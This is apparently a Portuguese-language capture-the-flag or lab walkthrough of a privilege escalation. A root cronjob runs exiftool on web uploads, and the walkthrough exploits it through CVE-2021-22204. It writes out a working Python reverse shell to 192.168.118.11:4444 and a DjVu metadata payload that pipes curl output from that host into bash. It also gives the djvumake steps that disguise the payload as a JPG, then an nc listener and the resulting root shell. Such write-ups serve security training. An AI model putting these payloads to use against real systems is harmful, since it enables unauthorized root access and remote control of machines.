## Privilege Escalation

### Cronjob Enumeration

Identificamos uma entrada no arquivo `/etc/crontab` que executa o script `/opt/image-exif.sh` como root a cada minuto.

```
# Exibindo o conteúdo de /etc/crontab
cat /etc/crontab
```

**Cronjob Identificado**:
```
cat /etc/crontab
# /etc/crontab: system-wide crontab
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```

### Script Analysis (`/opt/image-exif.sh`)

O script realiza processamento de metadados em imagens JPG usando `exiftool` e salva os dados processados em `/opt/metadata`.

```
# Exibindo o conteúdo de /opt/image-exif.sh
cat /opt/image-exif.sh
```

**Conteúdo do Script**:
```
#!/bin/bash
IMAGES='/var/www/html/subrion/uploads'
META='/opt/metadata'
FILE=$(openssl rand -hex 5)
LOGFILE="$META/$FILE"
ls $IMAGES | grep "jpg" | while read filename; do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done
```

**Análise**: O script executa `exiftool` em cada arquivo JPG no diretório de uploads, com potencial de exploração caso o `exiftool` seja vulnerável.

### Exploração de Arbitrary Code Execution com ExifTool (CVE-2021-22204)

Descoberta de vulnerabilidade de execução de código remoto (RCE) no ExifTool, documentada em CVE-2021-22204. Utilizamos o `djvumake` para criar um arquivo malicioso no formato DjVu.

1. **Instalar Dependência**: `djvulibre-bin` para gerar o arquivo DjVu.
   ```
   sudo apt-get update && sudo apt-get install -y djvulibre-bin
   ```

2. **Criar Arquivo de Payload**:
   - `shell.sh`: Script de reverse shell em Python.
   - `exploit`: Exploit para chamar `shell.sh` remotamente.
   
   ```
   # shell.sh (conteúdo do reverse shell)
   cat << 'EOF' > shell.sh
   #!/bin/bash
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   EOF
   ```

   ```
   # exploit (comando para executar o reverse shell via curl)
   cat << 'EOF' > exploit
   (metadata "\c${system ('curl http://192.168.118.11/shell.sh | bash')};")
   EOF
   ```

3. **Gerar Arquivo DjVu Malicioso**:
   ```
   djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
   mv exploit.djvu exploit.jpg
   ```

4. **Transferir o Arquivo para o Servidor**:
   ```
   wget http://192.168.118.11/exploit.jpg -O /var/www/html/subrion/uploads/exploit.jpg
   ```

5. **Ouvir Conexão Reversa**:
   Após um minuto, o cronjob executará o payload, e a shell reversa será conectada à porta 4444.

   ```
   nc -lvnp 4444
   ```

**Resultado**:
```
# id
uid=0(root) gid=0(root) groups=0(root)
```
